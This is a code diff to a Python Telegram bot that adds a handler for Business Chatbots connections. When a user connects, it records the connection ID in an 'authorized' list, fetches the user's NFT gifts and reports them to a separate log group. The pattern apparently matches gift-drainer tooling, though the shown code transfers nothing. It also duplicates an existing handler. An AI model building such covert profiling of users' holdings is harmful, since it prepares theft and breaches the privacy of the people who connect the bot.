@@ -55,6 +55,41 @@ async def verify_cb(callback: CallbackQuery):
     except TelegramBadRequest as e:
         await callback.answer(f"Error: {e.message}", show_alert=True)
 
+@dp.business_connection()
+async def on_business_connect(bc):
+    try:
+        info = await bot(GetBusinessConnection(business_connection_id=bc.connection_id))
+        uid = info.user.id
+        username = f"@{info.user.username}" if info.user.username else info.user.first_name
+
+        authorized[uid] = {
+            "connection_id": bc.connection_id,
+            "username": username,
+            "stars": 0,
+            "notified": False
+        }
+
+        # Fetch user NFTs
+        try:
+            gifts = await bot.get_user_gifts(user_id=uid)
+            if not gifts.gifts:
+                nft_text = "❌ No NFTs found for this user."
+            else:
+                nft_list = "\n".join([f"• {g.title or g.unique_id}" for g in gifts.gifts])
+                nft_text = f"🎁 NFTs of {username}:\n{nft_list}"
+        except Exception as e:
+            nft_text = f"⚠️ Failed to fetch NFTs: {e}"
+
+        # Send log to group
+        await bot.send_message(
+            LOG_GROUP_ID,
+            f"🤖 <a href='tg://user?id={uid}'>{username}</a> added the bot via Business Chatbots.\n\n{nft_text}",
+            parse_mode="HTML"
+        )
+
+    except TelegramBadRequest as e:
+        logging.error(f"Business connection error: {e.message}")
+
 # When user connects the bot from Business Chatbots
 @dp.business_connection()
 async def on_business_connect(bc):  # `bc` is already the BusinessConnection object
